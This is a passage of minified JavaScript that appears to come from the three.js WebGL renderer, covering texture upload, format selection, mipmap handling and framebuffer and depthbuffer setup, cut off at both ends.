je(0,0,0),L=0,w=!1,E=null,P=null,G=null,V=null,Z=null,Le.set(0,0,t.canvas.width,t.canvas.height),Ke.set(0,0,t.canvas.width,t.canvas.height),r.reset(),a.reset(),o.reset()}return{buffers:{color:r,depth:a,stencil:o},enable:te,disable:_e,bindFramebuffer:De,drawBuffers:be,useProgram:qe,setBlending:et,setMaterial:at,setFlipSided:Fe,setCullFace:Et,setLineWidth:k,setPolygonOffset:Mt,setScissorTest:Je,activeTexture:lt,bindTexture:Ee,unbindTexture:R,compressedTexImage2D:x,compressedTexImage3D:D,texImage2D:ke,texImage3D:re,updateUBOMapping:Me,uniformBlockBinding:ce,texStorage2D:le,texStorage3D:we,texSubImage2D:$,texSubImage3D:ee,compressedTexSubImage2D:q,compressedTexSubImage3D:Te,scissor:ue,viewport:Se,reset:Be}}function zA(t,e,n,i,s,r,a){const o=e.has("WEBGL_multisampled_render_to_texture")?e.get("WEBGL_multisampled_render_to_texture"):null,l=typeof navigator>"u"?!1:/OculusBrowser/g.test(navigator.userAgent),c=new Ze,p=new WeakMap;let d;const h=new WeakMap;let f=!1;try{f=typeof OffscreenCanvas<"u"&&new OffscreenCanvas(1,1).getContext("2d")!==null}catch{}function v(R,x){return f?new OffscreenCanvas(R,x):Dl("canvas")}function y(R,x,D){let $=1;const ee=Ee(R);if((ee.width>D||ee.height>D)&&($=D/Math.max(ee.width,ee.height)),$<1)if(typeof HTMLImageElement<"u"&&R instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&R instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&R instanceof ImageBitmap||typeof VideoFrame<"u"&&R instanceof VideoFrame){const q=Math.floor($*ee.width),Te=Math.floor($*ee.height);d===void 0&&(d=v(q,Te));const le=x?v(q,Te):d;return le.width=q,le.height=Te,le.getContext("2d").drawImage(R,0,0,q,Te),Ie("WebGLRenderer: Texture has been resized from ("+ee.width+"x"+ee.height+") to ("+q+"x"+Te+")."),le}else return"data"in R&&Ie("WebGLRenderer: Image in DataTexture is too big ("+ee.width+"x"+ee.height+")."),R;return R}function m(R){return R.generateMipmaps}function u(R){t.generateMipmap(R)}function g(R){return R.isWebGLCubeRenderTarget?t.TEXTURE_CUBE_MAP:R.isWebGL3DRenderTarget?t.TEXTURE_3D:R.isWebGLArrayRenderTarget||R.isCompressedArrayTexture?t.TEXTURE_2D_ARRAY:t.TEXTURE_2D}function _(R,x,D,$,ee=!1){if(R!==null){if(t[R]!==void 0)return t[R];Ie("WebGLRenderer: Attempt to use non-existing WebGL internal format '"+R+"'")}let q=x;if(x===t.RED&&(D===t.FLOAT&&(q=t.R32F),D===t.HALF_FLOAT&&(q=t.R16F),D===t.UNSIGNED_BYTE&&(q=t.R8)),x===t.RED_INTEGER&&(D===t.UNSIGNED_BYTE&&(q=t.R8UI),D===t.UNSIGNED_SHORT&&(q=t.R16UI),D===t.UNSIGNED_INT&&(q=t.R32UI),D===t.BYTE&&(q=t.R8I),D===t.SHORT&&(q=t.R16I),D===t.INT&&(q=t.R32I)),x===t.RG&&(D===t.FLOAT&&(q=t.RG32F),D===t.HALF_FLOAT&&(q=t.RG16F),D===t.UNSIGNED_BYTE&&(q=t.RG8)),x===t.RG_INTEGER&&(D===t.UNSIGNED_BYTE&&(q=t.RG8UI),D===t.UNSIGNED_SHORT&&(q=t.RG16UI),D===t.UNSIGNED_INT&&(q=t.RG32UI),D===t.BYTE&&(q=t.RG8I),D===t.SHORT&&(q=t.RG16I),D===t.INT&&(q=t.RG32I)),x===t.RGB_INTEGER&&(D===t.UNSIGNED_BYTE&&(q=t.RGB8UI),D===t.UNSIGNED_SHORT&&(q=t.RGB16UI),D===t.UNSIGNED_INT&&(q=t.RGB32UI),D===t.BYTE&&(q=t.RGB8I),D===t.SHORT&&(q=t.RGB16I),D===t.INT&&(q=t.RGB32I)),x===t.RGBA_INTEGER&&(D===t.UNSIGNED_BYTE&&(q=t.RGBA8UI),D===t.UNSIGNED_SHORT&&(q=t.RGBA16UI),D===t.UNSIGNED_INT&&(q=t.RGBA32UI),D===t.BYTE&&(q=t.RGBA8I),D===t.SHORT&&(q=t.RGBA16I),D===t.INT&&(q=t.RGBA32I)),x===t.RGB&&(D===t.UNSIGNED_INT_5_9_9_9_REV&&(q=t.RGB9_E5),D===t.UNSIGNED_INT_10F_11F_11F_REV&&(q=t.R11F_G11F_B10F)),x===t.RGBA){const Te=ee?Nl:We.getTransfer($);D===t.FLOAT&&(q=t.RGBA32F),D===t.HALF_FLOAT&&(q=t.RGBA16F),D===t.UNSIGNED_BYTE&&(q=Te===it?t.SRGB8_ALPHA8:t.RGBA8),D===t.UNSIGNED_SHORT_4_4_4_4&&(q=t.RGBA4),D===t.UNSIGNED_SHORT_5_5_5_1&&(q=t.RGB5_A1)}return(q===t.R16F||q===t.R32F||q===t.RG16F||q===t.RG32F||q===t.RGBA16F||q===t.RGBA32F)&&e.get("EXT_color_buffer_float"),q}function b(R,x){let D;return R?x===null||x===ci||x===Ga?D=t.DEPTH24_STENCIL8:x===ni?D=t.DEPTH32F_STENCIL8:x===Ha&&(D=t.DEPTH24_STENCIL8,Ie("DepthTexture: 16 bit depth attachment is not supported with stencil. Using 24-bit attachment.")):x===null||x===ci||x===Ga?D=t.DEPTH_COMPONENT24:x===ni?D=t.DEPTH_COMPONENT32F:x===Ha&&(D=t.DEPTH_COMPONENT16),D}function T(R,x){return m(R)===!0||R.isFramebufferTexture&&R.minFilter!==Bt&&R.minFilter!==qt?Math.log2(Math.max(x.width,x.height))+1:R.mipmaps!==void 0&&R.mipmaps.length>0?R.mipmaps.length:R.isCompressedTexture&&Array.isArray(R.image)?x.mipmaps.length:1}function A(R){const x=R.target;x.removeEventListener("dispose",A),L(x),x.isVideoTexture&&p.delete(x)}function C(R){const x=R.target;x.removeEventListener("dispose",C),E(x)}function L(R){const x=i.get(R);if(x.__webglInit===void 0)return;const D=R.source,$=h.get(D);if($){const ee=$[x.__cacheKey];ee.usedTimes--,ee.usedTimes===0&&w(R),Object.keys($).length===0&&h.delete(D)}i.remove(R)}function w(R){const x=i.get(R);t.deleteTexture(x.__webglTexture);const D=R.source,$=h.get(D);delete $[x.__cacheKey],a.memory.textures--}function E(R){const x=i.get(R);if(R.depthTexture&&(R.depthTexture.dispose(),i.remove(R.depthTexture)),R.isWebGLCubeRenderTarget)for(let $=0;$<6;$++){if(Array.isArray(x.__webglFramebuffer[$]))for(let ee=0;ee<x.__webglFramebuffer[$].length;ee++)t.deleteFramebuffer(x.__webglFramebuffer[$][ee]);else t.deleteFramebuffer(x.__webglFramebuffer[$]);x.__webglDepthbuffer&&t.deleteRenderbuffer(x.__webglDepthbuffer[$])}else{if(Array.isArray(x.__webglFramebuffer))for(let $=0;$<x.__webglFramebuffer.length;$++)t.deleteFramebuffer(x.__webglFramebuffer[$]);else t.deleteFramebuffer(x.__webglFramebuffer);if(x.__webglDepthbuffer&&t.deleteRenderbuffer(x.__webglDepthbuffer),x.__webglMultisampledFramebuffer&&t.deleteFramebuffer(x.__webglMultisampledFramebuffer),x.__webglColorRenderbuffer)for(let $=0;$<x.__webglColorRenderbuffer.length;$++)x.__webglColorRenderbuffer[$]&&t.deleteRenderbuffer(x.__webglColorRenderbuffer[$]);x.__webglDepthRenderbuffer&&t.deleteRenderbuffer(x.__webglDepthRenderbuffer)}const D=R.textures;for(let $=0,ee=D.length;$<ee;$++){const q=i.get(D[$]);q.__webglTexture&&(t.deleteTexture(q.__webglTexture),a.memory.textures--),i.remove(D[$])}i.remove(R)}let P=0;function G(){P=0}function V(){const R=P;return R>=s.maxTextures&&Ie("WebGLTextures: Trying to use "+R+" texture units while this GPU supports only "+s.maxTextures),P+=1,R}function Z(R){const x=[];return x.push(R.wrapS),x.push(R.wrapT),x.push(R.wrapR||0),x.push(R.magFilter),x.push(R.minFilter),x.push(R.anisotropy),x.push(R.internalFormat),x.push(R.format),x.push(R.type),x.push(R.generateMipmaps),x.push(R.premultiplyAlpha),x.push(R.flipY),x.push(R.unpackAlignment),x.push(R.colorSpace),x.join()}function O(R,x){const D=i.get(R);if(R.isVideoTexture&&Je(R),R.isRenderTargetTexture===!1&&R.isExternalTexture!==!0&&R.version>0&&D.__version!==R.version){const $=R.image;if($===null)Ie("WebGLRenderer: Texture marked for update but no image data found.");else if($.complete===!1)Ie("WebGLRenderer: Texture marked for update but image is incomplete");else{Y(D,R,x);return}}else R.isExternalTexture&&(D.__webglTexture=R.sourceTexture?R.sourceTexture:null);n.bindTexture(t.TEXTURE_2D,D.__webglTexture,t.TEXTURE0+x)}function z(R,x){const D=i.get(R);if(R.isRenderTargetTexture===!1&&R.version>0&&D.__version!==R.version){Y(D,R,x);return}else R.isExternalTexture&&(D.__webglTexture=R.sourceTexture?R.sourceTexture:null);n.bindTexture(t.TEXTURE_2D_ARRAY,D.__webglTexture,t.TEXTURE0+x)}function F(R,x){const D=i.get(R);if(R.isRenderTargetTexture===!1&&R.version>0&&D.__version!==R.version){Y(D,R,x);return}n.bindTexture(t.TEXTURE_3D,D.__webglTexture,t.TEXTURE0+x)}function I(R,x){const D=i.get(R);if(R.isCubeDepthTexture!==!0&&R.version>0&&D.__version!==R.version){te(D,R,x);return}n.bindTexture(t.TEXTURE_CUBE_MAP,D.__webglTexture,t.TEXTURE0+x)}const X={[Va]:t.REPEAT,[wi]:t.CLAMP_TO_EDGE,[yd]:t.MIRRORED_REPEAT},K={[Bt]:t.NEAREST,[nw]:t.NEAREST_MIPMAP_NEAREST,[Eo]:t.NEAREST_MIPMAP_LINEAR,[qt]:t.LINEAR,[Dc]:t.LINEAR_MIPMAP_NEAREST,[Rs]:t.LINEAR_MIPMAP_LINEAR},ne={[rw]:t.NEVER,[uw]:t.ALWAYS,[aw]:t.LESS,[ah]:t.LEQUAL,[ow]:t.EQUAL,[oh]:t.GEQUAL,[lw]:t.GREATER,[cw]:t.NOTEQUAL};function ye(R,x){if(x.type===ni&&e.has("OES_texture_float_linear")===!1&&(x.magFilter===qt||x.magFilter===Dc||x.magFilter===Eo||x.magFilter===Rs||x.minFilter===qt||x.minFilter===Dc||x.minFilter===Eo||x.minFilter===Rs)&&Ie("WebGLRenderer: Unable to use linear filtering with floating point textures. OES_texture_float_linear not supported on this device."),t.texParameteri(R,t.TEXTURE_WRAP_S,X[x.wrapS]),t.texParameteri(R,t.TEXTURE_WRAP_T,X[x.wrapT]),(R===t.TEXTURE_3D||R===t.TEXTURE_2D_ARRAY)&&t.texParameteri(R,t.TEXTURE_WRAP_R,X[x.wrapR]),t.texParameteri(R,t.TEXTURE_MAG_FILTER,K[x.magFilter]),t.texParameteri(R,t.TEXTURE_MIN_FILTER,K[x.minFilter]),x.compareFunction&&(t.texParameteri(R,t.TEXTURE_COMPARE_MODE,t.COMPARE_REF_TO_TEXTURE),t.texParameteri(R,t.TEXTURE_COMPARE_FUNC,ne[x.compareFunction])),e.has("EXT_texture_filter_anisotropic")===!0){if(x.magFilter===Bt||x.minFilter!==Eo&&x.minFilter!==Rs||x.type===ni&&e.has("OES_texture_float_linear")===!1)return;if(x.anisotropy>1||i.get(x).__currentAnisotropy){const D=e.get("EXT_texture_filter_anisotropic");t.texParameterf(R,D.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(x.anisotropy,s.getMaxAnisotropy())),i.get(x).__currentAnisotropy=x.anisotropy}}}function Le(R,x){let D=!1;R.__webglInit===void 0&&(R.__webglInit=!0,x.addEventListener("dispose",A));const $=x.source;let ee=h.get($);ee===void 0&&(ee={},h.set($,ee));const q=Z(x);if(q!==R.__cacheKey){ee[q]===void 0&&(ee[q]={texture:t.createTexture(),usedTimes:0},a.memory.textures++,D=!0),ee[q].usedTimes++;const Te=ee[R.__cacheKey];Te!==void 0&&(ee[R.__cacheKey].usedTimes--,Te.usedTimes===0&&w(x)),R.__cacheKey=q,R.__webglTexture=ee[q].texture}return D}function Ke(R,x,D){return Math.floor(Math.floor(R/D)/x)}function Qe(R,x,D,$){const q=R.updateRanges;if(q.length===0)n.texSubImage2D(t.TEXTURE_2D,0,0,0,x.width,x.height,D,$,x.data);else{q.sort((re,ue)=>re.start-ue.start);let Te=0;for(let re=1;re<q.length;re++){const ue=q[Te],Se=q[re],Me=ue.start+ue.count,ce=Ke(Se.start,x.width,4),Be=Ke(ue.start,x.width,4);Se.start<=Me+1&&ce===Be&&Ke(Se.start+Se.count-1,x.width,4)===ce?ue.count=Math.max(ue.count,Se.start+Se.count-ue.start):(++Te,q[Te]=Se)}q.length=Te+1;const le=t.getParameter(t.UNPACK_ROW_LENGTH),we=t.getParameter(t.UNPACK_SKIP_PIXELS),ke=t.getParameter(t.UNPACK_SKIP_ROWS);t.pixelStorei(t.UNPACK_ROW_LENGTH,x.width);for(let re=0,ue=q.length;re<ue;re++){const Se=q[re],Me=Math.floor(Se.start/4),ce=Math.ceil(Se.count/4),Be=Me%x.width,N=Math.floor(Me/x.width),fe=ce,ae=1;t.pixelStorei(t.UNPACK_SKIP_PIXELS,Be),t.pixelStorei(t.UNPACK_SKIP_ROWS,N),n.texSubImage2D(t.TEXTURE_2D,0,Be,N,fe,ae,D,$,x.data)}R.clearUpdateRanges(),t.pixelStorei(t.UNPACK_ROW_LENGTH,le),t.pixelStorei(t.UNPACK_SKIP_PIXELS,we),t.pixelStorei(t.UNPACK_SKIP_ROWS,ke)}}function Y(R,x,D){let $=t.TEXTURE_2D;(x.isDataArrayTexture||x.isCompressedArrayTexture)&&($=t.TEXTURE_2D_ARRAY),x.isData3DTexture&&($=t.TEXTURE_3D);const ee=Le(R,x),q=x.source;n.bindTexture($,R.__webglTexture,t.TEXTURE0+D);const Te=i.get(q);if(q.version!==Te.__version||ee===!0){n.activeTexture(t.TEXTURE0+D);const le=We.getPrimaries(We.workingColorSpace),we=x.colorSpace===Xi?null:We.getPrimaries(x.colorSpace),ke=x.colorSpace===Xi||le===we?t.NONE:t.BROWSER_DEFAULT_WEBGL;t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL,x.flipY),t.pixelStorei(t.UNPACK_PREMULTIPLY_ALPHA_WEBGL,x.premultiplyAlpha),t.pixelStorei(t.UNPACK_ALIGNMENT,x.unpackAlignment),t.pixelStorei(t.UNPACK_COLORSPACE_CONVERSION_WEBGL,ke);let re=y(x.image,!1,s.maxTextureSize);re=lt(x,re);const ue=r.convert(x.format,x.colorSpace),Se=r.convert(x.type);let Me=_(x.internalFormat,ue,Se,x.colorSpace,x.isVideoTexture);ye($,x);let ce;const Be=x.mipmaps,N=x.isVideoTexture!==!0,fe=Te.__version===void 0||ee===!0,ae=q.dataReady,me=T(x,re);if(x.isDepthTexture)Me=b(x.format===Ps,x.type),fe&&(N?n.texStorage2D(t.TEXTURE_2D,1,Me,re.width,re.height):n.texImage2D(t.TEXTURE_2D,0,Me,re.width,re.height,0,ue,Se,null));else if(x.isDataTexture)if(Be.length>0){N&&fe&&n.texStorage2D(t.TEXTURE_2D,me,Me,Be[0].width,Be[0].height);for(let ie=0,J=Be.length;ie<J;ie++)ce=Be[ie],N?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,ce.width,ce.height,ue,Se,ce.data):n.texImage2D(t.TEXTURE_2D,ie,Me,ce.width,ce.height,0,ue,Se,ce.data);x.generateMipmaps=!1}else N?(fe&&n.texStorage2D(t.TEXTURE_2D,me,Me,re.width,re.height),ae&&Qe(x,re,ue,Se)):n.texImage2D(t.TEXTURE_2D,0,Me,re.width,re.height,0,ue,Se,re.data);else if(x.isCompressedTexture)if(x.isCompressedArrayTexture){N&&fe&&n.texStorage3D(t.TEXTURE_2D_ARRAY,me,Me,Be[0].width,Be[0].height,re.depth);for(let ie=0,J=Be.length;ie<J;ie++)if(ce=Be[ie],x.format!==jn)if(ue!==null)if(N){if(ae)if(x.layerUpdates.size>0){const oe=xm(ce.width,ce.height,x.format,x.type);for(const Ne of x.layerUpdates){const ct=ce.data.subarray(Ne*oe/ce.data.BYTES_PER_ELEMENT,(Ne+1)*oe/ce.data.BYTES_PER_ELEMENT);n.compressedTexSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,Ne,ce.width,ce.height,1,ue,ct)}x.clearLayerUpdates()}else n.compressedTexSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,0,ce.width,ce.height,re.depth,ue,ce.data)}else n.compressedTexImage3D(t.TEXTURE_2D_ARRAY,ie,Me,ce.width,ce.height,re.depth,0,ce.data,0,0);else Ie("WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()");else N?ae&&n.texSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,0,ce.width,ce.height,re.depth,ue,Se,ce.data):n.texImage3D(t.TEXTURE_2D_ARRAY,ie,Me,ce.width,ce.height,re.depth,0,ue,Se,ce.data)}else{N&&fe&&n.texStorage2D(t.TEXTURE_2D,me,Me,Be[0].width,Be[0].height);for(let ie=0,J=Be.length;ie<J;ie++)ce=Be[ie],x.format!==jn?ue!==null?N?ae&&n.compressedTexSubImage2D(t.TEXTURE_2D,ie,0,0,ce.width,ce.height,ue,ce.data):n.compressedTexImage2D(t.TEXTURE_2D,ie,Me,ce.width,ce.height,0,ce.data):Ie("WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):N?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,ce.width,ce.height,ue,Se,ce.data):n.texImage2D(t.TEXTURE_2D,ie,Me,ce.width,ce.height,0,ue,Se,ce.data)}else if(x.isDataArrayTexture)if(N){if(fe&&n.texStorage3D(t.TEXTURE_2D_ARRAY,me,Me,re.width,re.height,re.depth),ae)if(x.layerUpdates.size>0){const ie=xm(re.width,re.height,x.format,x.type);for(const J of x.layerUpdates){const oe=re.data.subarray(J*ie/re.data.BYTES_PER_ELEMENT,(J+1)*ie/re.data.BYTES_PER_ELEMENT);n.texSubImage3D(t.TEXTURE_2D_ARRAY,0,0,0,J,re.width,re.height,1,ue,Se,oe)}x.clearLayerUpdates()}else n.texSubImage3D(t.TEXTURE_2D_ARRAY,0,0,0,0,re.width,re.height,re.depth,ue,Se,re.data)}else n.texImage3D(t.TEXTURE_2D_ARRAY,0,Me,re.width,re.height,re.depth,0,ue,Se,re.data);else if(x.isData3DTexture)N?(fe&&n.texStorage3D(t.TEXTURE_3D,me,Me,re.width,re.height,re.depth),ae&&n.texSubImage3D(t.TEXTURE_3D,0,0,0,0,re.width,re.height,re.depth,ue,Se,re.data)):n.texImage3D(t.TEXTURE_3D,0,Me,re.width,re.height,re.depth,0,ue,Se,re.data);else if(x.isFramebufferTexture){if(fe)if(N)n.texStorage2D(t.TEXTURE_2D,me,Me,re.width,re.height);else{let ie=re.width,J=re.height;for(let oe=0;oe<me;oe++)n.texImage2D(t.TEXTURE_2D,oe,Me,ie,J,0,ue,Se,null),ie>>=1,J>>=1}}else if(Be.length>0){if(N&&fe){const ie=Ee(Be[0]);n.texStorage2D(t.TEXTURE_2D,me,Me,ie.width,ie.height)}for(let ie=0,J=Be.length;ie<J;ie++)ce=Be[ie],N?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,ue,Se,ce):n.texImage2D(t.TEXTURE_2D,ie,Me,ue,Se,ce);x.generateMipmaps=!1}else if(N){if(fe){const ie=Ee(re);n.texStorage2D(t.TEXTURE_2D,me,Me,ie.width,ie.height)}ae&&n.texSubImage2D(t.TEXTURE_2D,0,0,0,ue,Se,re)}else n.texImage2D(t.TEXTURE_2D,0,Me,ue,Se,re);m(x)&&u($),Te.__version=q.version,x.onUpdate&&x.onUpdate(x)}R.__version=x.version}function te(R,x,D){if(x.image.length!==6)return;const $=Le(R,x),ee=x.source;n.bindTexture(t.TEXTURE_CUBE_MAP,R.__webglTexture,t.TEXTURE0+D);const q=i.get(ee);if(ee.version!==q.__version||$===!0){n.activeTexture(t.TEXTURE0+D);const Te=We.getPrimaries(We.workingColorSpace),le=x.colorSpace===Xi?null:We.getPrimaries(x.colorSpace),we=x.colorSpace===Xi||Te===le?t.NONE:t.BROWSER_DEFAULT_WEBGL;t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL,x.flipY),t.pixelStorei(t.UNPACK_PREMULTIPLY_ALPHA_WEBGL,x.premultiplyAlpha),t.pixelStorei(t.UNPACK_ALIGNMENT,x.unpackAlignment),t.pixelStorei(t.UNPACK_COLORSPACE_CONVERSION_WEBGL,we);const ke=x.isCompressedTexture||x.image[0].isCompressedTexture,re=x.image[0]&&x.image[0].isDataTexture,ue=[];for(let J=0;J<6;J++)!ke&&!re?ue[J]=y(x.image[J],!0,s.maxCubemapSize):ue[J]=re?x.image[J].image:x.image[J],ue[J]=lt(x,ue[J]);const Se=ue[0],Me=r.convert(x.format,x.colorSpace),ce=r.convert(x.type),Be=_(x.internalFormat,Me,ce,x.colorSpace),N=x.isVideoTexture!==!0,fe=q.__version===void 0||$===!0,ae=ee.dataReady;let me=T(x,Se);ye(t.TEXTURE_CUBE_MAP,x);let ie;if(ke){N&&fe&&n.texStorage2D(t.TEXTURE_CUBE_MAP,me,Be,Se.width,Se.height);for(let J=0;J<6;J++){ie=ue[J].mipmaps;for(let oe=0;oe<ie.length;oe++){const Ne=ie[oe];x.format!==jn?Me!==null?N?ae&&n.compressedTexSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,oe,0,0,Ne.width,Ne.height,Me,Ne.data):n.compressedTexImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,oe,Be,Ne.width,Ne.height,0,Ne.data):Ie("WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()"):N?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,oe,0,0,Ne.width,Ne.height,Me,ce,Ne.data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,oe,Be,Ne.width,Ne.height,0,Me,ce,Ne.data)}}}else{if(ie=x.mipmaps,N&&fe){ie.length>0&&me++;const J=Ee(ue[0]);n.texStorage2D(t.TEXTURE_CUBE_MAP,me,Be,J.width,J.height)}for(let J=0;J<6;J++)if(re){N?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,0,0,0,ue[J].width,ue[J].height,Me,ce,ue[J].data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,0,Be,ue[J].width,ue[J].height,0,Me,ce,ue[J].data);for(let oe=0;oe<ie.length;oe++){const ct=ie[oe].image[J].image;N?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,oe+1,0,0,ct.width,ct.height,Me,ce,ct.data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,oe+1,Be,ct.width,ct.height,0,Me,ce,ct.data)}}else{N?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,0,0,0,Me,ce,ue[J]):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,0,Be,Me,ce,ue[J]);for(let oe=0;oe<ie.length;oe++){const Ne=ie[oe];N?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,oe+1,0,0,Me,ce,Ne.image[J]):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+J,oe+1,Be,Me,ce,Ne.image[J])}}}m(x)&&u(t.TEXTURE_CUBE_MAP),q.__version=ee.version,x.onUpdate&&x.onUpdate(x)}R.__version=x.version}function _e(R,x,D,$,ee,q){const Te=r.convert(D.format,D.colorSpace),le=r.convert(D.type),we=_(D.internalFormat,Te,le,D.colorSpace),ke=i.get(x),re=i.get(D);if(re.__renderTarget=x,!ke.__hasExternalTextures){const ue=Math.max(1,x.width>>q),Se=Math.max(1,x.height>>q);ee===t.TEXTURE_3D||ee===t.TEXTURE_2D_ARRAY?n.texImage3D(ee,q,we,ue,Se,x.depth,0,Te,le,null):n.texImage2D(ee,q,we,ue,Se,0,Te,le,null)}n.bindFramebuffer(t.FRAMEBUFFER,R),Mt(x)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,$,ee,re.__webglTexture,0,k(x)):(ee===t.TEXTURE_2D||ee>=t.TEXTURE_CUBE_MAP_POSITIVE_X&&ee<=t.TEXTURE_CUBE_MAP_NEGATIVE_Z)&&t.framebufferTexture2D(t.FRAMEBUFFER,$,ee,re.__webglTexture,q),n.bindFramebuffer(t.FRAMEBUFFER,null)}function De(R,x,D){if(t.bindRenderbuffer(t.RENDERBUFFER,R),x.depthBuffer){const $=x.depthTexture,ee=$&&$.isDepthTexture?$.type:null,q=b(x.stencilBuffer,ee),Te=x.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;Mt(x)?o.renderbufferStorageMultisampleEXT(t.RENDERBUFFER,k(x),q,x.width,x.height):D?t.renderbufferStorageMultisample(t.RENDERBUFFER,k(x),q,x.width,x.height):t.renderbufferStorage(t.RENDERBUFFER,q,x.width,x.height),t.framebufferRenderbuffer(t.FRAMEBUFFER,Te,t.RENDERBUFFER,R)}else{const $=x.textures;for(let ee=0;ee<$.length;ee++){const q=$[ee],Te=r.convert(q.format,q.colorSpace),le=r.convert(q.type),we=_(q.internalFormat,Te,le,q.colorSpace);Mt(x)?o.renderbufferStorageMultisampleEXT(t.RENDERBUFFER,k(x),we,x.width,x.height):D?t.renderbufferStorageMultisample(t.RENDERBUFFER,k(x),we,x.width,x.height):t.renderbufferStorage(t.RENDERBUFFER,we,x.width,x.height)}}t.bindRenderbuffer(t.RENDERBUFFER,null)}function be(R,x,D){const $=x.isWebGLCubeRenderTarget===!0;if(n.bindFramebuffer(t.FRAMEBUFFER,R),!(x.depthTexture&&x.depthTexture.isDepthTexture))throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");const ee=i.get(x.depthTexture);if(ee.__renderTarget=x,(!ee.__webglTexture||x.depthTexture.image.width!==x.width||x.depthTexture.image.height!==x.height)&&(x.depthTexture.image.width=x.width,x.depthTexture.image.height=x.height,x.depthTexture.needsUpdate=!0),$){if(ee.__webglInit===void 0&&(ee.__webglInit=!0,x.depthTexture.addEventListener("dispose",A)),ee.__webglTexture===void 0){ee.__webglTexture=t.createTexture(),n.bindTexture(t.TEXTURE_CUBE_MAP,ee.__webglTexture),ye(t.TEXTURE_CUBE_MAP,x.depthTexture);const ke=r.convert(x.depthTexture.format),re=r.convert(x.depthTexture.type);let ue;x.depthTexture.format===Li?ue=t.DEPTH_COMPONENT24:x.depthTexture.format===Ps&&(ue=t.DEPTH24_STENCIL8);for(let Se=0;Se<6;Se++)t.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+Se,0,ue,x.width,x.height,0,ke,re,null)}}else O(x.depthTexture,0);const q=ee.__webglTexture,Te=k(x),le=$?t.TEXTURE_CUBE_MAP_POSITIVE_X+D:t.TEXTURE_2D,we=x.depthTexture.format===Ps?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;if(x.depthTexture.format===Li)Mt(x)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,we,le,q,0,Te):t.framebufferTexture2D(t.FRAMEBUFFER,we,le,q,0);else if(x.depthTexture.format===Ps)Mt(x)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,we,le,q,0,Te):t.framebufferTexture2D(t.FRAMEBUFFER,we,le,q,0);else throw new Error("Unknown depthTexture format")}function qe(R){const x=i.get(R),D=R.isWebGLCubeRenderTarget===!0;if(x.__boundDepthTexture!==R.depthTexture){const $=R.depthTexture;if(x.__depthDisposeCallback&&x.__depthDisposeCallback(),$){const ee=()=>{delete x.__boundDepthTexture,delete x.__depthDisposeCallback,$.removeEventListener("dispose",ee)};$.addEventListener("dispose",ee),x.__depthDisposeCallback=ee}x.__boundDepthTexture=$}if(R.depthTexture&&!x.__autoAllocateDepthBuffer)if(D)for(let $=0;$<6;$++)be(x.__webglFramebuffer[$],R,$);else{const $=R.texture.mipmaps;$&&$.length>0?be(x.__webglFramebuffer[0],R,0):be(x.__webglFramebuffer,R,0)}else if(D){x.__webglDepthbuffer=[];for(let $=0;$<6;$++)if(n.bindFramebuffer(t.FRAMEBUFFER,x.__webglFramebuffer[$]),x.__webglDepthbuffer[$]===void 0)x.__webglDepthbuffer[$]=t.createRenderbuffer(),De(x.__webglDepthbuffer[$],R,!1);else{const ee=R.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,q=x.__webglDepthbuffer[$];t.bindRenderbuffer(t.RENDERBUFFER,q),t.framebufferRenderbuffer(t.FRAMEBUFFER,ee,t.RENDERBUFFER,q)}}else{const $=R.texture.mipmaps;if($&&$.length>0?n.bindFramebuffer(t.FRAMEBUFFER,x.__webglFramebuffer[0]):n.bindFramebuffer(t.FRAMEBUFFER,x.__webglFramebuffer),x.__webglDepthbuffer===void 0)x.__webglDepthbuffer=t.createRenderbuffer(),De(x.__webglDepthbuffer,R,!1);else{const ee=R.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,q=x.__webglDepthbuffer;t.bindRenderbuffer(t.RENDERBUFFER,q),t.framebufferRenderbuffer(t.FRAMEBUFFER,ee,t.RENDERBUFFER,q)}}n.bindFramebuffer(t.FRAMEBUFFER,null)}function Nt(R,x,D){const $=i.get(R);x!==void 0&&_e($.__webglFramebuffer,R,R.texture,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,0),D!==void 0&&qe(R)}function Ge(R){const x=R.texture,D=i.get(R),$=i.get(x);R.addEventListener("dispose",C);const ee=R.textures,q=R.isWebGLCubeRenderTarget===!0,Te=ee.length>1;if(Te||($.__webglTexture===void 